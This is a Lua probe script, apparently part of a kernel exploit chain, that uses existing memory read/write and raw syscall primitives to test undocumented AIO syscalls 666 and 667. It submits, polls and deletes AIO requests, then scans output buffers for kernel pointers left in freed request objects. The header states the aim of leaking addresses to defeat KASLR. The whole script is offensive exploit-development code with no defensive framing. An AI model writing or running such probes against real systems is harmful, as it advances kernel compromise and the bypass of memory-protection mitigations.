-- CRASH_CLASS: LOW
-- PROBE 69t: 666/667 AIO syscall semantics deep characterization
--
-- Context: 666 and 667 are in the AIO family (662-670) but have NEVER been
-- individually tested beyond basic id/count/states shape. They might return
-- more data per ID than 662/664 — possibly including R-object fields with
-- kernel pointers at R+0x00/R+0x08. This is critical for the KASLR leak
-- path: if 666 or 667 copy more than a 4-byte status dword, the stale
-- kernel thread addresses in the freed R-object could leak to userland.

print("=== PROBE 69t: 666/667 SEMANTICS DEEP CHARACTERIZATION ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Open /dev/zero for AIO reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)
if fd_zero < 0 then print("FAIL: no /dev/zero"); return end

-- ============================================================
-- AIO helpers
-- ============================================================
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function submit_one()
    local reqs = memory.alloc(0x30)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    local id_buf = memory.alloc(8)
    wd(N(id_buf), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_buf)))
    end)
    return rd(N(id_buf)) or 0
end

local function poll_ids(ids_arr, count)
    local ids_buf = memory.alloc(count * 4 + 8)
    local st_buf = memory.alloc(count * 4 + 8)
    for i = 1, count do
        wd(N(ids_buf) + (i - 1) * 4, ids_arr[i])
        wd(N(st_buf) + (i - 1) * 4, 0xDEAD)
    end
    pcall(function()
        mk(664)(uint64(N(ids_buf)), uint64(count), uint64(N(st_buf)))
    end)
    local results = {}
    for i = 1, count do
        results[i] = rd(N(st_buf) + (i - 1) * 4) or 0xDEAD
    end
    return results
end

-- ============================================================
-- [A] Submit and poll AIO requests
-- ============================================================
print("")
print("[A] Submitting 16 AIO requests")
local ids = {}
for i = 1, 16 do
    local id = submit_one()
    if id ~= 0 then table.insert(ids, id) end
end
print("  submitted: " .. #ids)
if #ids < 8 then print("FAIL: too few IDs"); return end

local poll_st = poll_ids(ids, #ids)
print("  polled " .. #ids .. " IDs, first status: 0x" .. string.format("%X", poll_st[1]))

for i = 1, math.min(4, #ids) do
    print(string.format("  id[%d] = 0x%X  poll_st=0x%X", i, ids[i], poll_st[i]))
end
if not alive() then print("DEAD after submit"); return end

-- ============================================================
-- [B] 664 baseline: what does 664 write per ID?
-- ============================================================
print("")
print("[B] 664 baseline with 1KB sentinel buffer")
do
    local out = memory.alloc(0x400)
    for j = 0, 0x3FC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

    local id_buf = memory.alloc(4)
    wd(N(id_buf), ids[1])

    pcall(function()
        mk(664)(uint64(N(id_buf)), uint64(1), uint64(N(out)))
    end)

    local modified = {}
    for j = 0, 0x3FC, 4 do
        local v = rd(N(out) + j) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then
            table.insert(modified, {off = j, val = v})
        end
    end
    print(string.format("  664: %d dwords modified", #modified))
    for _, m in ipairs(modified) do
        local h = rd(N(out) + m.off + 4) or 0xCCCCCCCC
        print(string.format("    +0x%02X: 0x%08X (next_dword: 0x%08X)%s",
            m.off, m.val, h,
            (m.val >= 0xFFFF8000 and m.val ~= 0xFFFFFFFF) and " *** KPTR? ***" or ""))
    end
end

if not alive() then print("DEAD after 664 baseline"); return end

-- ============================================================
-- [C] 666 with same ID — compare to 664
-- ============================================================
print("")
print("[C] 666 with 1KB sentinel buffer")
do
    local out = memory.alloc(0x400)
    for j = 0, 0x3FC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

    local id_buf = memory.alloc(4)
    wd(N(id_buf), ids[1])

    local ret = nil
    pcall(function()
        ret = mk(666)(uint64(N(id_buf)), uint64(1), uint64(N(out)))
    end)
    local r = ret and sgn(ret) or -999
    print(string.format("  666 ret=%d", r))

    local modified = {}
    for j = 0, 0x3FC, 4 do
        local v = rd(N(out) + j) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then
            table.insert(modified, {off = j, val = v})
        end
    end
    print(string.format("  666: %d dwords modified", #modified))
    for _, m in ipairs(modified) do
        local h = rd(N(out) + m.off + 4) or 0xCCCCCCCC
        print(string.format("    +0x%02X: 0x%08X (next_dword: 0x%08X)%s",
            m.off, m.val, h,
            (m.val >= 0xFFFF8000 and m.val ~= 0xFFFFFFFF) and " *** KPTR? ***" or ""))
    end
end

if not alive() then print("DEAD after 666 test"); return end

-- ============================================================
-- [D] 667 with same ID — compare to 664
-- ============================================================
print("")
print("[D] 667 with 1KB sentinel buffer")
do
    local out = memory.alloc(0x400)
    for j = 0, 0x3FC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

    local id_buf = memory.alloc(4)
    wd(N(id_buf), ids[2])

    local ret = nil
    pcall(function()
        ret = mk(667)(uint64(N(id_buf)), uint64(1), uint64(N(out)))
    end)
    local r = ret and sgn(ret) or -999
    print(string.format("  667 ret=%d", r))

    local modified = {}
    for j = 0, 0x3FC, 4 do
        local v = rd(N(out) + j) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then
            table.insert(modified, {off = j, val = v})
        end
    end
    print(string.format("  667: %d dwords modified", #modified))
    for _, m in ipairs(modified) do
        local h = rd(N(out) + m.off + 4) or 0xCCCCCCCC
        print(string.format("    +0x%02X: 0x%08X (next_dword: 0x%08X)%s",
            m.off, m.val, h,
            (m.val >= 0xFFFF8000 and m.val ~= 0xFFFFFFFF) and " *** KPTR? ***" or ""))
    end
end

if not alive() then print("DEAD after 667 test"); return end

-- ============================================================
-- [E] 666 with additional arguments (arg4-arg6 sweep)
-- ============================================================
print("")
print("[E] 666 with extra args")
local extra_vals = {0, 1, 2, 3, 4, 5, 6, 7, 8, 0x10, 0x100, 0xFFFFFFFF}

for _, a4 in ipairs(extra_vals) do
    if not alive() then break end
    local out = memory.alloc(0x40)
    for j = 0, 0x3C, 4 do wd(N(out) + j, 0xCCCCCCCC) end
    local id_buf = memory.alloc(4)
    wd(N(id_buf), ids[3])

    local ret = nil
    pcall(function()
        ret = mk(666)(uint64(N(id_buf)), uint64(1), uint64(N(out)),
            uint64(a4), uint64(0), uint64(0))
    end)
    local r = ret and sgn(ret) or -999
    local v0 = rd(N(out)) or 0xCCCCCCCC
    local modified = 0
    for j = 0, 0x3C, 4 do
        if (rd(N(out) + j) or 0xCCCCCCCC) ~= 0xCCCCCCCC then modified = modified + 1 end
    end
    local tag = ""
    if modified > 1 then tag = " *** EXTRA ***" end
    if r ~= 0 and r ~= -1 and r ~= -999 then tag = tag .. " *** UNUSUAL ***" end
    print(string.format("  666(a4=0x%X): ret=%d d0=0x%08X mod=%d%s", a4, r, v0, modified, tag))
end

if not alive() then print("DEAD after 666 arg sweep"); return end

-- ============================================================
-- [F] 667 with additional arguments (arg4-arg6 sweep)
-- ============================================================
print("")
print("[F] 667 with extra args")
for _, a4 in ipairs(extra_vals) do
    if not alive() then break end
    local out = memory.alloc(0x40)
    for j = 0, 0x3C, 4 do wd(N(out) + j, 0xCCCCCCCC) end
    local id_buf = memory.alloc(4)
    wd(N(id_buf), ids[4])

    local ret = nil
    pcall(function()
        ret = mk(667)(uint64(N(id_buf)), uint64(1), uint64(N(out)),
            uint64(a4), uint64(0), uint64(0))
    end)
    local r = ret and sgn(ret) or -999
    local v0 = rd(N(out)) or 0xCCCCCCCC
    local modified = 0
    for j = 0, 0x3C, 4 do
        if (rd(N(out) + j) or 0xCCCCCCCC) ~= 0xCCCCCCCC then modified = modified + 1 end
    end
    local tag = ""
    if modified > 1 then tag = " *** EXTRA ***" end
    if r ~= 0 and r ~= -1 and r ~= -999 then tag = tag .. " *** UNUSUAL ***" end
    print(string.format("  667(a4=0x%X): ret=%d d0=0x%08X mod=%d%s", a4, r, v0, modified, tag))
end

if not alive() then print("DEAD after 667 arg sweep"); return end

-- ============================================================
-- [G] Multi-ID stride test: 666/667 with count=8
-- ============================================================
print("")
print("[G] Multi-ID: 666/667 with count=8, 2KB output")

local multi_ids = memory.alloc(8 * 4)
for i = 1, 8 do wd(N(multi_ids) + (i - 1) * 4, ids[i]) end

for _, sc_num in ipairs({666, 667}) do
    if not alive() then break end

    local out = memory.alloc(0x800)
    for j = 0, 0x7FC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

    local ret = nil
    pcall(function()
        ret = mk(sc_num)(uint64(N(multi_ids)), uint64(8), uint64(N(out)))
    end)
    local r = ret and sgn(ret) or -999

    local modified = {}
    for j = 0, 0x7FC, 4 do
        local v = rd(N(out) + j) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then
            table.insert(modified, {off = j, val = v})
        end
    end

    print(string.format("  %d(count=8): ret=%d modified=%d dwords", sc_num, r, #modified))

    -- Show all modified positions
    for _, m in ipairs(modified) do
        local h = rd(N(out) + m.off + 4) or 0xCCCCCCCC
        local kptr = ""
        if m.val >= 0xFFFF8000 and m.val ~= 0xFFFFFFFF then kptr = " *** KPTR? ***" end
        print(string.format("    +0x%03X: 0x%08X (next: 0x%08X)%s",
            m.off, m.val, h, kptr))
    end

    -- Infer stride if exactly 8 modified
    if #modified == 8 then
        local stride = modified[2].off - modified[1].off
        print(string.format("  stride: %d bytes (0x%X)", stride, stride))
    elseif #modified > 8 then
        print("  *** MORE THAN 8 WRITES — extra data per ID! ***")
        -- Check if there's a pattern: n writes per ID
        local writes_per_id = #modified / 8
        print(string.format("  %.1f writes per ID", writes_per_id))
    end
end

if not alive() then print("DEAD after multi-ID test"); return end

-- ============================================================
-- [H] 666/667 with unpolled IDs — different behavior?
-- ============================================================
print("")
print("[H] 666/667 on freshly submitted (unpolled) IDs")

local fresh_ids = {}
for i = 1, 4 do
    local id = submit_one()
    if id ~= 0 then table.insert(fresh_ids, id) end
end
print(string.format("  fresh (unpolled) IDs: %d", #fresh_ids))

if #fresh_ids >= 2 then
    for _, sc_num in ipairs({666, 667}) do
        if not alive() then break end

        local out = memory.alloc(0x100)
        for j = 0, 0xFC, 4 do wd(N(out) + j, 0xCCCCCCCC) end
        local id_buf = memory.alloc(4)
        wd(N(id_buf), fresh_ids[sc_num == 666 and 1 or 2])

        local ret = nil
        pcall(function()
            ret = mk(sc_num)(uint64(N(id_buf)), uint64(1), uint64(N(out)))
        end)
        local r = ret and sgn(ret) or -999

        local modified = 0
        local first_val = rd(N(out)) or 0xCCCCCCCC
        for j = 0, 0xFC, 4 do
            if (rd(N(out) + j) or 0xCCCCCCCC) ~= 0xCCCCCCCC then modified = modified + 1 end
        end
        print(string.format("  %d(unpolled): ret=%d d0=0x%08X mod=%d",
            sc_num, r, first_val, modified))
    end

    -- Now poll them and retry
    print("  polling fresh IDs...")
    local fp = poll_ids(fresh_ids, #fresh_ids)
    for _, sc_num in ipairs({666, 667}) do
        if not alive() then break end

        local out = memory.alloc(0x100)
        for j = 0, 0xFC, 4 do wd(N(out) + j, 0xCCCCCCCC) end
        local id_buf = memory.alloc(4)
        wd(N(id_buf), fresh_ids[sc_num == 666 and 1 or 2])

        local ret = nil
        pcall(function()
            ret = mk(sc_num)(uint64(N(id_buf)), uint64(1), uint64(N(out)))
        end)
        local r = ret and sgn(ret) or -999

        local modified = 0
        local first_val = rd(N(out)) or 0xCCCCCCCC
        for j = 0, 0xFC, 4 do
            if (rd(N(out) + j) or 0xCCCCCCCC) ~= 0xCCCCCCCC then modified = modified + 1 end
        end
        print(string.format("  %d(after poll): ret=%d d0=0x%08X mod=%d",
            sc_num, r, first_val, modified))
    end
end

if not alive() then print("DEAD after unpolled test"); return end

-- ============================================================
-- [I] 666/667 with deleted IDs — what happens?
-- ============================================================
print("")
print("[I] 666/667 on deleted IDs")

-- Delete IDs 5 and 6
local del_ids_buf = memory.alloc(8)
local del_st_buf = memory.alloc(8)
for idx = 5, 6 do
    wd(N(del_ids_buf), ids[idx])
    wd(N(del_st_buf), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(del_ids_buf)), uint64(1), uint64(N(del_st_buf)))
    end)
    local ds = rd(N(del_st_buf)) or 0xDEAD
    print(string.format("  deleted id[%d]=0x%X status=0x%X", idx, ids[idx], ds))
end

for _, sc_num in ipairs({666, 667}) do
    if not alive() then break end

    local out = memory.alloc(0x100)
    for j = 0, 0xFC, 4 do wd(N(out) + j, 0xCCCCCCCC) end
    local id_buf = memory.alloc(4)
    wd(N(id_buf), ids[5])

    local ret = nil
    pcall(function()
        ret = mk(sc_num)(uint64(N(id_buf)), uint64(1), uint64(N(out)))
    end)
    local r = ret and sgn(ret) or -999

    local modified = 0
    local first_val = rd(N(out)) or 0xCCCCCCCC
    for j = 0, 0xFC, 4 do
        local v = rd(N(out) + j) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then
            modified = modified + 1
            local h = rd(N(out) + j + 4) or 0xCCCCCCCC
            if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF then
                print(string.format("    *** KPTR at +0x%02X: 0x%08X%08X ***",
                    j, v, rd(N(out) + j - 4) or 0))
            end
        end
    end
    print(string.format("  %d(deleted id): ret=%d d0=0x%08X mod=%d",
        sc_num, r, first_val, modified))
end

if not alive() then print("DEAD after deleted-ID test"); return end

-- ============================================================
-- [J] 666 arg5 sweep (like 663 mode parameter)
-- ============================================================
print("")
print("[J] 666 arg5 sweep with count=4")

local four_ids = memory.alloc(16)
for i = 1, 4 do wd(N(four_ids) + (i - 1) * 4, ids[i + 6]) end

local arg5_vals = {0, 1, 2, 3, 4, 5, 6, 7, 0x10, 0x100, 0x1000}
for _, a5 in ipairs(arg5_vals) do
    if not alive() then break end

    local out = memory.alloc(0x100)
    for j = 0, 0xFC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

    local ret = nil
    pcall(function()
        ret = mk(666)(uint64(N(four_ids)), uint64(4), uint64(N(out)),
            uint64(0), uint64(a5), uint64(0))
    end)
    local r = ret and sgn(ret) or -999

    local modified = 0
    for j = 0, 0xFC, 4 do
        if (rd(N(out) + j) or 0xCCCCCCCC) ~= 0xCCCCCCCC then modified = modified + 1 end
    end
    print(string.format("  666(a5=0x%X): ret=%d mod=%d", a5, r, modified))
end

-- ============================================================
-- [K] 667 arg5 sweep
-- ============================================================
print("")
print("[K] 667 arg5 sweep with count=4")

for _, a5 in ipairs(arg5_vals) do
    if not alive() then break end

    local out = memory.alloc(0x100)
    for j = 0, 0xFC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

    local ret = nil
    pcall(function()
        ret = mk(667)(uint64(N(four_ids)), uint64(4), uint64(N(out)),
            uint64(0), uint64(a5), uint64(0))
    end)
    local r = ret and sgn(ret) or -999

    local modified = 0
    for j = 0, 0xFC, 4 do
        if (rd(N(out) + j) or 0xCCCCCCCC) ~= 0xCCCCCCCC then modified = modified + 1 end
    end
    print(string.format("  667(a5=0x%X): ret=%d mod=%d", a5, r, modified))
end

if not alive() then print("DEAD after arg5 sweep"); return end

-- ============================================================
-- [L] Cleanup
-- ============================================================
print("")
print("[L] Cleanup")
local cleaned = 0
for _, id in ipairs(ids) do
    local s = memory.alloc(4)
    local ib = memory.alloc(4)
    wd(N(ib), id); wd(N(s), 0xDEAD)
    pcall(function() mk(662)(uint64(N(ib)), uint64(1), uint64(N(s))) end)
    if (rd(N(s)) or 0xDEAD) == 0 then cleaned = cleaned + 1 end
end
for _, id in ipairs(fresh_ids) do
    local s = memory.alloc(4)
    local ib = memory.alloc(4)
    wd(N(ib), id); wd(N(s), 0xDEAD)
    pcall(function() mk(662)(uint64(N(ib)), uint64(1), uint64(N(s))) end)
    if (rd(N(s)) or 0xDEAD) == 0 then cleaned = cleaned + 1 end
end
print(string.format("  cleaned %d IDs", cleaned))
print("  alive=" .. (alive() and "YES" or "NO"))

print("")
print("=== PROBE 69t COMPLETE ===")
